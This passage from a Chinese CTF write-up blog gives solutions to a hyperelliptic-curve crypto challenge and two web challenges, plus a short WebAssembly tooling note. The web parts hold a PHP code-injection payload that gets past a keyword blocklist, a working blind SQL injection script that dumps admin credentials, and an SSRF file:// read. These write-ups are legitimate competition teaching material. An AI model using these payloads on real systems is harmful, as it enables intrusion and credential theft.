class="built_in">sum</span>(clk())</span><br><span class="line">    rs = [u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] + [v[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> rs <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> rs</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxx&#125;&quot;</span></span><br><span class="line">text = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+flag</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">keys = generate()</span><br><span class="line">leng = <span class="built_in">len</span>(keys)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">    t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keys[i%leng])^^<span class="built_in">ord</span>(x))</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> t.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5</span><br></pre></td></tr></table></figure></blockquote><p>代码逻辑：</p><p>密文为flag与超椭圆曲线 $y^2=x+x^7$ 随机生成值异或得到，由于部分明文已知，通过随机生成器(RNG)部分的代码恢复剩余字符。</p><blockquote><p>对于域 $K$，亏格为 $g$ 超椭圆曲线基本形式是 $C:y^2+h(x)y=f(x)$，其中 $h(x),f(x) \in K[x]$（多项式系数都在 $K$ 上），且 $\deg(h(x)) \leq g$，$\deg(f(x))=2g+1$。</p><p>超椭圆曲线密码体制是建立在超椭圆曲线的Jacobian群上的，有限域上超椭圆曲线的Jacobian群是一个有限交换群，Jacobian阶记为 $J(C)$。可以在 $J(C)$中定义归约除子的一个加法运算 。使得 $J(C)$成为一个交换群，这个有限交换群是超椭圆曲线密码体制的基础。</p><p>每个元素 $D \in J(C)$ 都可以唯一表示为 $K[x]$ 上的一个多项式元组 $\langle u(x),v(x) \rangle$，多项式满足：</p><ul><li>$u(x)$ 是首一多项式</li><li>$u(x)$ 整除 $f(x)-h(x)v(x)-v^2(x)$</li><li>$\deg(v(x)) \lt \deg(u(x)) \lt g$</li></ul></blockquote><p>这里 $h(x)=0,f(x)=x+x^7$，RNG部分生成三个随机数 $e_1,e_2,e_3$ 以及三个元素 $D_1,D_2,D_3 \in J(C)$，</p><p>RNG部分计算 $\langle u(x),v(x) \rangle=e_1D_1+e_2D_2+e_3D_3$ 并将系数转换为字节。</p><p>结合已知的<code>a*20+flag</code>共24字节，可以恢复 $u(x)$。</p><p>对于 $v(x)$，根据 $D \in J(C)$ 的性质，有 $f(x)-h(x)v(x)-v^2(x) \equiv 0 \pmod {u(x)}$</p><p>如果 $x_i$ 是 $u(x)$ 的根（$K$ 代数闭包下），有 $f(x_i)-h(x_i)v(x_i)-v^2(x_i) = 0 \Longrightarrow v^2(x_i)+h(x_i)v(x_i)=f(x_i)$，</p><p>说明 $(x_i,v(x_i))$ 是 $C$ 上的一个点。</p><p>又 $h(x_i)=0$，则 $v^2(x_i)=f(x_i) \Longrightarrow v(x_i) = \pm \sqrt{f(x_i)}$。</p><p>由于 $u(x)$ 次数为3，在$K$ 代数闭包下，可以找到三个根 $x_1,x_2,x_3$，即 $C$ 上的三个点 $(x_1,v(x_1)),(x_2,v(x_2)),(x_3,v(x_3))$，利用拉格朗日插值方法可以恢复 $v(x)$。</p><p>得到 $u(x)$ 和 $v(x)$，异或操作还原明文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product, cycle</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line">K = GF(p)</span><br><span class="line">R.&lt;x&gt; = K[]</span><br><span class="line">y = x</span><br><span class="line">f = y + y^<span class="number">7</span></span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_u_from_out</span>(<span class="params">output, known_input</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        res.append(output[i]^^known_input[i])</span><br><span class="line">    res = <span class="built_in">bytes</span>(res)</span><br><span class="line">    u0, u1, u2 = struct.unpack(<span class="string">&quot;&lt;QQQ&quot;</span>, res)</span><br><span class="line">    u = x^<span class="number">3</span>+x^<span class="number">2</span>*u2+x*u1+u0</span><br><span class="line">    <span class="keyword">return</span> u</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_v_from_u</span>(<span class="params">u</span>):</span></span><br><span class="line">    Kbar = GF(p^<span class="number">6</span>)</span><br><span class="line">    Rbar.&lt;t&gt; = Kbar[<span class="string">&quot;t&quot;</span>]</span><br><span class="line">    u2 = u.change_ring(Rbar)</span><br><span class="line">    roots = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> u2.roots()]</span><br><span class="line">    ys = []</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">        ys.append(f(root).sqrt(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> perm <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>), repeat=<span class="number">3</span>):</span><br><span class="line">        poly = Rbar.lagrange_polynomial([(roots[i], ys[i][perm[i]]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)])</span><br><span class="line">        <span class="keyword">if</span> poly[<span class="number">0</span>] <span class="keyword">in</span> K:</span><br><span class="line">            res.append(R(poly))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_decode</span>(<span class="params">output, u, v</span>):</span></span><br><span class="line">    rs = [u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], v[<span class="number">0</span>], v[<span class="number">1</span>], v[<span class="number">2</span>]]</span><br><span class="line">    otp = struct.pack(<span class="string">&quot;&lt;QQQQQQ&quot;</span>, *rs)</span><br><span class="line">    decrypted = [a^^b <span class="keyword">for</span> (a, b) <span class="keyword">in</span> <span class="built_in">zip</span>(output, cycle(otp)) ]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(decrypted)</span><br><span class="line"></span><br><span class="line">output = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;</span>)</span><br><span class="line">known_input = <span class="string">b&#x27;a&#x27;</span> * <span class="number">20</span> + <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line">u = get_u_from_out(output, known_input)</span><br><span class="line">vs = get_v_from_u(u)</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> vs:</span><br><span class="line">    <span class="comment">#print((u,v))</span></span><br><span class="line">    <span class="built_in">print</span>(try_decode(output,u,v))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="comment">#b&#x27;aaaaaaaaaaaaaaaaaaaaflag&#123;1b82f60a-43ab-4f18-8ccc-97d120aae6fc&#125;&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;aaaaaaaaaaaaaaaaaaaaflag|\xb1J\xedFp^v2\xb9\x10\x16\xf6\xfddD(h7\xb6\xc3S\xe0\xcf-97d120aae6fc&#125;&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;aaaaaaaaaaaaaaaaaaaaflag\xe3J\xad\x88\xb2\xac\xf8\x1c-C\x07\x97\x02/B47l\xd0\xf30\x8f&amp;\xbf-97d120aae6fc&#125;&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;aaaaaaaaaaaaaaaaaaaaflag\xe4\xca\xf5\xbd\xc6\xa6\x00B\xfe\xde\xe3z\x9a\xbe\x95D\xf9\xc2\xafD\xda\xff\xa3\xeb-97d120aae6fc&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>flag值：flag{1b82f60a-43ab-4f18-8ccc-97d120aae6fc}</strong></p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>主页面没什么有用信息，扫描发现<code>robots.txt</code>，访问提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">When I was a child,I also like to read Robots.txt</span><br><span class="line"></span><br><span class="line">Here is what you want:1ndexx.php</span><br></pre></td></tr></table></figure><p>访问<code>1ndexx.php</code>报500 Internal Server Error，尝试看是否存在vim源码泄露，发现访问<code>.1ndexx.php.swp</code>能回显源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$link</span> = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background-color: white;</span><br><span class="line">text-align: center;</span><br><span class="line">padding: <span class="number">50</span>px;</span><br><span class="line">font-family: <span class="string">&quot;Open Sans&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#logo &#123;</span></span><br><span class="line">margin-bottom: <span class="number">40</span>px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img id=<span class="string">&quot;logo&quot;</span> src=<span class="string">&quot;logo.png&quot;</span> /&gt;</span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello My freind!&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="variable">$link</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;h2&gt;I Can<span class="string">&#x27;t view my php files?!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; else &#123; ?&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#Really easy...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;</span>code<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(preg_match(&#x27;</span>/system|<span class="keyword">eval</span>|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|<span class="function"><span class="keyword">function</span>|<span class="title">call</span>|\~|\^|\`|<span class="title">flag</span>|<span class="title">cat</span>|<span class="title">tac</span>|<span class="title">more</span>|<span class="title">tail</span>|<span class="title">echo</span>|<span class="title">require</span>|<span class="title">include</span>|<span class="title">proc</span>|<span class="title">open</span>|<span class="title">read</span>|<span class="title">shell</span>|<span class="title">file</span>|<span class="title">put</span>|<span class="title">get</span>|<span class="title">contents</span>|<span class="title">dir</span>|<span class="title">link</span>|<span class="title">dl</span>|<span class="title">var</span>|<span class="title">dump</span>/&#x27;,$<span class="title">a</span>))</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$a</span>)&gt;<span class="number">33</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$hack</span>,<span class="variable">$a</span>);</span><br><span class="line">fwrite(<span class="variable">$hack</span>,<span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br><span class="line">fclose(<span class="variable">$hack</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码逻辑：</p><p>将<code>flag.php</code>文件内容读入变量<code>$I_know_you_wanna_but_i_will_not_give_you_hhh</code>，并将传入的<code>code</code>参数值与变量<code>$I_know_you_wanna_but_i_will_not_give_you_hhh</code>一起写入<code>hack.php</code>文件中。</p><p>对<code>code</code>参数值过滤的关键字不少：</p><p><code>system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|~|^|`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump</code></p><p>用命令执行、文件读写等多种方式尝试向<code>hack.php</code>写入php代码，以显示<code>flag.php</code>文件内容，发现<code>show_source()</code>函数可行。</p><p>payload: <code>?code=&lt;?=show_source(&quot;fla&quot;.&quot;g.php&quot;);</code></p><p>最后访问<code>hack.php</code>，得到<code>flag.php</code>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#ini_set(&#x27;display_errors&#x27;,true);</span></span><br><span class="line"><span class="comment">#error_reporting(E_ALL ^ E_NOTICE);</span></span><br><span class="line"></span><br><span class="line">flag=MZWGCZ33HA3GIOJWHA2DGLJYGNTDCLJUGE3DSLJZMQZDILJZGY3TIZRTHE3GMMJQGN6Q====;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;What is important for a new bird of php??&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Base32解码得flag。</p><p><strong>flag值：flag{86d96843-83f1-4169-9d24-9674f396f103}</strong></p><p>​    </p><h3 id="WebsiteManager"><a href="#WebsiteManager" class="headerlink" title="WebsiteManager"></a>WebsiteManager</h3><blockquote><p>最新的网站测试器，作为非站长的你，能利用好它的功能吗？</p></blockquote><p>查看网页源码发现<code>image.php?id=1</code>，猜测存在sql注入，手工测试发现过滤了空格和双引号，且测试<code>?id=-2/**/or/**/1=1</code>有图片显示，<code>?id=-2/**/or/**/1=2</code>无图片显示，验证存在注入点，采用布尔盲注跑出登录用户名和密码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2zefme7yqvztnp4652um.cloudeci1.ichunqiu.com/image.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;&#x27;&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(username,password))from(ctf.users)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&#x27;&#x27;&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">f&quot;-2/**/or/**/<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,params=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;HRN&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="comment">#库名: ctf</span></span><br><span class="line"><span class="comment">#表名: images,users</span></span><br><span class="line"><span class="comment">#users表中列名： username,password</span></span><br><span class="line"><span class="comment">#users表中值： admin,9ebab83595888e5a8bd57</span></span><br></pre></td></tr></table></figure><p>用<code>admin</code>和<code>9ebab83595888e5a8bd57</code>直接登录，结合<code>curl.php</code>猜测是SSRF，填入<code>http://127.0.0.1/</code>得到访问结果回显验证猜测，尝试改用file伪协议直接读取根目录flag文件得到flag。</p><p><img src="/2021/05/09/match-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20210509192000500.png" alt="image-20210509192000500"></p><p>payload: <code>file://127.0.0.1/flag</code> 或 <code>file:///flag</code></p><p><strong>flag值：flag{f0d06b4c-954e-4a76-ad5d-95bd0227daea}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;这一届的misc+crypto也太少了，一二血同队+垂直上分明显。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h2&gt;&lt;h3 id</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>WebAssembly</title>
    <link href="https://lazzzaro.github.io/2021/04/03/reverse-WebAssembly/"/>
    <id>https://lazzzaro.github.io/2021/04/03/reverse-WebAssembly/</id>
    <published>2021-04-03T15:30:16.000Z</published>
    <updated>2021-11-03T15:43:03.537Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>WebAssembly（wasm）是基于堆栈的虚拟机的二进制指令格式。wasm被设计为可编程C / C ++ / Rust等高级语言的可移植目标，可在Web上部署客户端和服务器应用程序。</p><p>​    </p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://github.com/WebAssembly/wabt">wabt</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global url.<span class="string">&quot;git://&quot;</span>.insteadOf https://</span><br><span class="line">$ git <span class="built_in">clone</span> --recursive https://github.com/WebAssembly/wabt</span><br><span class="line">$ <span class="built_in">cd</span> wabt</span><br><span class="line">$ git submodule update --init</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ cmake ..</span><br><span class="line">$ cmake --build .</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>反汇编：</p><p><code>./wasm2wat wasm.wasm -o wasm.wat</code></p><p>反编译：</p><p><code>./wasm2c wasm.wasm -o wasm.c</code> （查看末尾字符串）</p><p>优化：</p><p><code>gcc -c wasm.c -o wasm.o</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;WebAssembly（wasm）是基于堆栈的虚拟机的二进制指令格式。wasm被设计为可编程C / C ++ / Rust等高级语言的可移植目标，可在Web上部署客户端和服务器应用程序。&lt;/p&gt;
&lt;p&gt;​    &lt;/p&gt;
&lt;h3 id=&quot;安装&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="reverse" scheme="https://lazzzaro.github.io/categories/reverse/"/>
    
    
    <category term="WebAssembly" scheme="https://lazzzaro.github.io/tags/WebAssembly/"/>
    
    <category term="wasm" scheme="https://lazzzaro.github.io/tags/wasm/"/>
    
  </entry>
  
  <entry>
    <title>2021数字中国创新大赛虎符网络安全赛道</title>
    <link href="https://lazzzaro.github.io/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/"/>
    <id>https://lazzzaro.github.io/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/</id>
    <published>2021-04-03T12:31:00.000Z</published>
    <updated>2021-10-16T16:22:07.999Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>数字中国是十九大提出的新时代国家信息化发展的新战略。2021数字中国创新大赛，作为数字中国建设峰会“一会、一展、一赛”的重要组成部分， 将继续采取多赛道并行的竞赛形式，设置数字党建、数字政府、大数据、智慧医疗、鲲鹏计算、网络安全、集成电路设计、青少年AI机器人八个赛道，紧贴数字中国建设峰会主题，围绕核心前沿技术与信息技术应用创新设置赛题，以多维度立体化的角度诠释“数字中国”。</p><p>第二届“虎符网络安全赛道“将在去年首次将PK体系与传统网络安全竞赛相结合的优势基础上，继续保持Wintel+PK双体系并行模式进行比赛，以“PK体系”在网络安全赛事中的创新升级应用作为赛事的核心驱动。同时在此基础上进行包括赛事场景、评委阵容以及选手权益在内的三大升级。</p><p><a href="https://www.ichunqiu.com/2021hfctf">https://www.ichunqiu.com/2021hfctf</a></p><p>​    </p><p>rank: 80+</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="你会日志分析吗"><a href="#你会日志分析吗" class="headerlink" title="你会日志分析吗"></a>你会日志分析吗</h3><blockquote><p>线索只有一份access.log，你能从中分析到什么？</p></blockquote><p>明显能看出access.log日志文件中包含SQL时间盲注的记录，直接拉到最后看</p><p><code>?id=1&#39;%20and%20if(ord(substr((select%20flag%20from%20flllag),xx,1))=xx,sleep(2),1)</code>语句，</p><p>逐个字符猜解，正确情形会延迟2s，观察每行前一列的时间秒数，不连续的部分前一个字符即为正确字符。</p><p>懒写脚本，逐个手撸得到一串十进制数</p><p><code>90 109 120 104 90 51 116 90 98 51 86 102 89 88 74 108 88 51 78 118 88 50 100 121 90 87 70 48 102 81 61 61</code>，</p><p>转为字符为base64编码字符串<code>ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==</code>，解码即为flag。</p><p><strong>flag</strong></p><p><code>flag&#123;You_are_so_great&#125;</code></p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="cubic"><a href="#cubic" class="headerlink" title="cubic"></a>cubic</h3><blockquote><p>Please give me 6 pairs of positive integers (x,y,z) satisfying the equation <code>x/(y+z) + y/(z+x) + z/(x+y) = 6</code></p></blockquote><p>给出著名不定方程 $\cfrac{x}{y+z}+\cfrac{y}{x+z}+\cfrac{z}{x+y}=6$ 的6组<strong>正整数</strong>解，乍看容易实则不然。</p><p>方程在<strong>整数</strong>范围内易通过爆破求得多解，而<strong>正整数</strong>范围内很难用初等代数人工求得多解，需结合抽象代数解决。</p><p>背景参考：<a href="https://zhuanlan.zhihu.com/p/33853851">史上最贱的数学题</a></p><p>把 $x,y,z$ 看为 